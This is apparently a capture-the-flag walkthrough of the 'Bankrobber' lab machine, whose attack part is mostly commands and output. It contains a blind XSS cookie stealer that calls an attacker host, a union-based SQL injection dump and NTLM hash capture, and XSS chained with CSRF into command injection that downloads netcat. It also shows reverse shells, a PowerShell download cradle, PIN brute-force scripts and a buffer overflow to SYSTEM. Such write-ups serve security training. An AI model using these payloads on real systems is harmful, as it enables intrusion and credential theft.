**Skills Required**
Enumeration
JavaScript XSS Payloads
SQL Injection
**Skills Learned**
Command Injection
File read through SQLi
Buffer Overflow

Port 80 (http)
port 445 (smb)
port 443(https)

There are two ports pointing to a website and port 445 for SMB, I'm going to use the crackmapexec tool to gather more information about the victim machine.
```
❯ crackmapexec smb 10.10.10.154
SMB         10.10.10.154    445    BANKROBBER       [*] Windows 10 Pro 14393 (name:BANKROBBER) (domain:Bankrobber) (signing:False) (SMBv1:True)
```

I can list the shared drivers with smbmap

```
❯ smbmap -H 10.10.10.154 -u 'null'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com   
                     https://github.com/ShawnDEvans/smbmap

[!] Authentication error on 10.10.10.154
```

However, I receive a "Authentication error" response, which  means  I need valid credentials to be able to list the shared drivers on the victim machine.

Upon checking the website, I found  a login panel and a Registration panel.
I created a new user to gather more information.
It's a Cryptocurrency application that allow me to transfer "E-coin"
A windows pop up indicated that someone would review my transfer.
This is a clue; if someone checks what I'm transferring, maybe I can send some XSS payload and try to steal their cookies.

``` javascript
#check the Blind XSS payload
<script src="http://10.10.14.2/pwn.js"></script>

#On my machine
❯ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.154 - - [17/Sep/2023 23:48:45] code 404, message File not found
10.10.10.154 - - [17/Sep/2023 23:48:45] "GET /pwn.js HTTP/1.1" 404 -
```

The victim machine requested a connection to my machine, confirming the XSS vulnerabilitie
So, I'll create a .js script  to try to steel the admin's cookies,taking advantage of this vulnerabilitie

``` javascript
#create pwn.js
var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.14.3/?cookie=' + document.cookie, true);
request.send();

#On the website form
<script src="http://10.10.14.2/pwn.js"></script>

#Listening
❯ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.154 - - [17/Sep/2023 23:54:00] "GET /pwn.js HTTP/1.1" 200 -
10.10.10.154 - - [17/Sep/2023 23:54:00] "GET /?cookie=username=YWRtaW4=;%20password=SG9wZWxlc3Nyb21hbnRpYw==;%20id=1 HTTP/1.1" 200 -
❯ echo "YWRtaW4=" | base64 -d; echo
admin
❯ echo "SG9wZWxlc3Nyb21hbnRpYw==" | base64 -d; echo
Hopelessromantic

```

This way I obtained the cookies from the "admin" user. These cookies have weak encryption, wich I can decode with base64 to obtain the credentials in plain text.
Now that I can log in as Admin in the web application, I found a "Search Users" function  vulnerable to sql injection.

``` mysql
1' (It's vulnerable)
1' or 1=1-- - (confirm the vulnerability)
1' order by 100-- - (to see what error shows)
1' order by 3-- - (there are 3 columns)
1' union select 1,2,3-- - (this shows 1 and 2 -> this is the camp that I use to inject queries)
1' union select 1,databases(),3-- - (the database in use)
1' union select 1,version(),3-- - (the MariaDB version)
1' union select 1,schema_name,3 from information_schema.schemata-- - (list existing dtabases)
1' union select 1,table_name,3 from information_schema.tables where table_schema="mysql"-- - (enumerate tables from database mysql)
1' union select 1,column_name,3 from information_schema.columns where table_schema="mysql" and table_name="user"-- - (enumerate columns from database mysql)
1' union select 1,group_concat(User,":",Password),3 from mysql.user-- - (enumerate existing users ands passwords)
root:*F435725A173757E57BD36B09048B8B610FF4D0C4,root:*F435725A173757E57BD36B09048B8B610FF4D0C4,root:*F435725A173757E57BD36B09048B8B610FF4D0C4,:,pma:
```

I retrieved data from the databases; including credentials for the 'root' user. However, these credentials didn't immediately help me.

```
credentials -> root:Welkom1!
```


So, I used the sql injection again to retrieve some files from the victim machine.
``` mysql

1' union select 1,load_file(""),3-- - (LFI)

```

this works, I tried to load a file using SMB
``` mysql
#On my machine
smbserver Shared_Test $(pwd) -smb2support

#On the web app
1' union select 1,load_file("\\\\10.10.14.3\\Shared_Test\\test"),3-- - (Get NTML2 hash)

❯ sudo smbserver.py Shared_Test $(pwd) -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Incoming connection (10.10.10.154,49861)
[*] AUTHENTICATE_MESSAGE (BANKROBBER\Cortin,BANKROBBER)
[*] User BANKROBBER\Cortin authenticated successfully
[*] Cortin::BANKROBBER:aaaaaaaaaaaaaaaa:b72e1fb24874179c2a39badee8d363a7:01010000000000000066fdddeee9d901d18f69efd3941d9200000000010010007a004c0078006f004a00700066005000030010007a004c0078006f004a00700066005000020010006300430041004d004600740058007400040010006300430041004d004600740058007400070008000066fdddeee9d9010600040002000000080030003000000000000000000000000020000095c2bd809e583040ce9023a771889b033d20c797d13c67be8751de99e4679c1e0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003200000000000000000000000000


```

Amazing, with this injection I obtained the NTML2 hash for the User "cortin".  Now I need to crack it

``` bash
john --wordlist=rockyou.txt hash
```

Jonh doesn't crack the hash, but at least I have a Username.

Returning to the web application, I found another function (backdoor checker) which allows injecting only the "dir" command but is only accessible from thje localhost server.
This function makes a request to the "backdoorchecker.php" file, so, tried to load this file using the sql injection vulnerabily  I discovered early, I used Buprsuite to review correctly the file.
``` mysql

1' union select 1,load_file("C:\\xampp\\htdocs\\admin\\backdoorchecker.php"),3-- -

```
By analyzing this file, I can check  the commands that are banned in the function and hows the application validates if the request is from the localhost server or not.
I can try the XSS vulnerability that I used before to try to access it from the local host server.
It's assumed there is an Admin checking the requests on the server, so I can attempt to make the admin execute the commands in the backdoor checker application because they have server-side access(localhost)
The idea is to exploit the XSS and then perform an CSRF attack, followd by attempting RCE to abuse the backdoor checker application

``` javascript
#On my machine edit the pwn.js
var request = new XMLHttpRequest();
	params = 'cmd=dir|powershell -c "iwr -uri http://10.10.14.2/nc64.exe -OutFile %temp%\\nc.exe"; %temp%\\nc.exe -e cmd 10.10.14.2 1234'
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-Type'; 'application/x-www-form-urlencoded');
request.send(params);

sudo python -m http.server 80
rlwrap nc -nlvp 1234

#On the web http://10.10.10.154/user/

<script src="http://10.10.14.2/pwn.js"></script>
```

In this way, I gain access to the victim machine.

Now I need to escalate privileges
``` bash
whoami /priv (nothing)
net user cortin (nothing)
net user (users: Admin, Gast)
netstat -nat (port 910 open internaly)
tasklist (pexisting process "bankv2.exe" PID 1580)
netstat -ano (bankv2.exe using port 910)
cd %temp%
.\nc.exe 127.0.0.1 910

# revershell via powershell using nishang
python -m http.server 80
rlwrap nc -nlvp 1234

# On victim machine
powershell -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/ps.ps1')"

```

there's an internal application that requests a PIN, which I can try to bruteforce.

``` python
# make a socks5 with chisel to access the internal port outside the victim machine
#On victim machine
iwr -uri http://10.10.14.3/chisel.exe -OutFile chisel.exe #or certutil.exe -f -urlcache -split http://10.10.14.3/chisel.exe chisel.exe
.\chisel client 10.10.14.3:1234 R:socks #or .\chisel client 10.10.14.3:1234 R:910:127.0.0.1:910

#On my machine
python -m http.server 80
./chisel server --reverse -p 1234

```

I'll create a Python or bash script to brute force the application
``` bash
#!/bin/bash
#
pins_list="pins.txt"
while IFS= read -r line; do 
  echo -ne "\r$line"
  tput el 

  echo $line | proxychains &>/dev/null netcat 10.10.10.154 910 > test &


  sleep 1  


  if ps -p $! > /dev/null; then

    kill $!
  fi

  if ! grep "denied" test &>/dev/null; then

    echo "Este este $line"
    break 
  fi

done < "$pins_list"
```

``` python
#!/usr/bin/python3

from pwn import *
import time

def tryPin():

	# create a dictionary > #in bash -> for i in {0000..9999}; do echo $i; done > pins.txt
	pins = open("pins.txt", "r")

	p1 = log.progress("Fuerza Bruta")
	p1.status("COmenzando fuerza bruta")
	time.sleep(2)

	for pin in pins:
		p1.status("probando con el pin %s [%s/10000]" % (pin.strip('\n'), str(counter)))
		
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('127.0.0.1', 910))
		
		data = s.recv(4096)
		
		s.send(pin.encode())
		
		data = s.recv(1024)
		
		if b"Access denied" not in data:
			p1.success("El pin correcto es %s" % pin.strip('\n'))
			sys.exit(0)
			
		counter +=1
	

if __name__ == '__main__'

	tryPin()

```
Correct pin 0021

After numerous attempts, I encountered an overflow by inputting several "A"s.
I can try to control the program and attempt to execute "nc.exe" which I already uploaded to the machine earlier, to gain a reverse shell as the user controlling the application

``` bash
pattern_create -l 48
# take the 4firts bytes
pattern_offset -q 0Ab1 -> 32
# payloas 
❯ python2 -c 'print "A"*32 + "C:\\Users\\Cortin\\AppData\\Local\\Temp\\nc64.exe -e cmd 10.10.14.2 4444"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\AppData\Local\Temp\nc64.exe -e cmd 10.10.14.2 4444

```

And now I have access as  "nt authority\system" 

User flag -> 2d15528a3b846dfcae01e6611bd26597
root flag -> a17ceb41ef9ced10b81fdbbbc14f3625